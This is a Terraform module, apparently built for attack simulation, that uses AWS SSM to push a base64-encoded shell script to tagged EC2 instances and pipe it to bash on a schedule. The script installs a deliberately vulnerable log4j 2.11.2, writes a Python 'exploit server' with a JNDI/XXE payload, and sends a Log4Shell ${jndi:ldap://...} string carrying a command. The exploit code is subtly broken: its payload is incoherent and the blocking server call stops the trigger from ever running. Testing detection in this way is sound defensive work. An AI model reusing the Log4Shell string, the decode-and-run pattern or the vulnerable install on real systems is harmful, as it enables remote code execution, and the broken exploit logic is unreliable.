locals {
    image = "ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929"
    name = "log4shell"
    listen_port=var.listen_port
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    check_apt() {
        pgrep -f "apt" || pgrep -f "dpkg"
    }
    while check_apt; do
        log "Waiting for apt to be available..."
        sleep 10
    done
    log "Checking for docker..."
    apt-get update && apt install -y --allow-downgrades liblog4j2-java=2.11.2-1 openjdk-8-jdk 
    mkdir -p /log4j-demo/resources && cd /log4j-demo
    cat > Log4jDemo.java <<-EOF
    import org.apache.logging.log4j.LogManager;
    import org.apache.logging.log4j.Logger;

    public class Log4jDemo {
        private static final Logger logger = LogManager.getLogger(Log4jDemo.class);

        public static void main(String[] args) {
            String userMessage = args.length > 0 ? args[0] : "Hello, World!";
            logger.info("User message: {}", userMessage);
        }
    }
    EOF
    cat > resources/log4j2.xml <<-EOF
    <?xml version="1.0" encoding="UTF-8"?>
    <Configuration status="WARN">
        <Appenders>
            <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" />
            </Console>
        </Appenders>
        <Loggers>
            <Root level="info">
            <AppenderRef ref="Console" />
            </Root>
        </Loggers>
    </Configuration>
    EOF
    javac -cp /usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo.java
    java -cp .:resources:/usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo
    cat > exploit.py <<-EOF
    import socket
    import sys
    from base64 import b64encode

    malicious_payload = b'jaas.context=system\n' \
                        b'java.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory\n' \
                        b'java.naming.provider.url=rmi://127.0.0.1:1099\n' \
                        b'java.naming.security.authentication=none\n' \
                        b'java.naming.security.principal=none\n' \
                        b'java.naming.security.credentials=none\n' \
                        b'\n' \
                        b'com.sun.jndi.rmi.object.trustURLCodebase=true\n' \
                        b'com.sun.jndi.cosnaming.object.trustURLCodebase=true\n' \
                        b'com.sun.jndi.ldap.object.trustURLCodebase=true\n' \
                        b'com.sun.jndi.fscontext.RefFSContextFactory.host=localhost\n' \
                        b'com.sun.jndi.fscontext.RefFSContextFactory.port=80\n' \
                        b'com.sun.jndi.fscontext.object.trustURLCodebase=true\n' \
                        b'com.sun.jndi.ldap.connect.pool.timeout=0\n' \
                        b'com.sun.jndi.rmi.factory.socketFactory=com.sun.jndi.ldap.ext.StartTlsSocketFactory\n' \
                        b'com.sun.jndi.rmi.factory.ssl.socketFactory=javax.net.ssl.SSLSocketFactory\n' \
                        b'\n' \
                        b'<?xml version="1.0" encoding="UTF-8"?>\n' \
                        b'<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://127.0.0.1:8000/test.dtd">%remote;]>\n'

    def exploit_server(port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(5)

        print(f'[+] Exploit server is running on port {port}')

        while True:
            client_socket, addr = server.accept()
            print(f'[+] Connection from {addr}')

            data = client_socket.recv(1024)
            print(f'[+] Received data: {data.decode(errors="ignore")}')

            response = b'HTTP/1.1 200 OK\r\n'
            response += b'Content-Type: text/plain\r\n'
            response += f'Content-Length: {len(malicious_payload)}\r\n'.encode()
            response += b'\r\n'
            response += malicious_payload

            client_socket.send(response)
            client_socket.close()


    if __name__ == '__main__':
        if len(sys.argv) != 2:
            print(f'Usage: {sys.argv[0]} <port>')
            sys.exit(1)

        port = int(sys.argv[1])
        exploit_server(port)
    EOF
    python3 exploit.py 8000
    java -cp .:resources:/usr/share/java/log4j-core-2.11.2.jar:/usr/share/java/log4j-api-2.11.2.jar Log4jDemo '$${jndi:ldap://localhost:8000/o=%7B%22type%22%3A%22EXEC%22%2C%22cmd%22%3A%22touch+/tmp/pwned.txt%22%7D}'

    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

###########################
# SSM 
###########################

resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

resource "aws_ssm_document" "this" {
  name          = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "attack simulation",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "${var.timeout}",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "this" {
    name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    resource_query {
        query = jsonencode({
                    ResourceTypeFilters = [
                        "AWS::EC2::Instance"
                    ]

                    TagFilters = [
                        {
                            Key = "${var.tag}"
                            Values = [
                                "true"
                            ]
                        },
                        {
                            Key = "deployment"
                            Values = [
                                var.deployment
                            ]
                        },
                        {
                            Key = "environment"
                            Values = [
                                var.environment
                            ]
                        }
                    ]
                })
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "this" {
    association_name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    name = aws_ssm_document.this.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.this.name,
        ]
    }

    compliance_severity = "HIGH"

    # cronjob
    schedule_expression = "${var.cron}"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}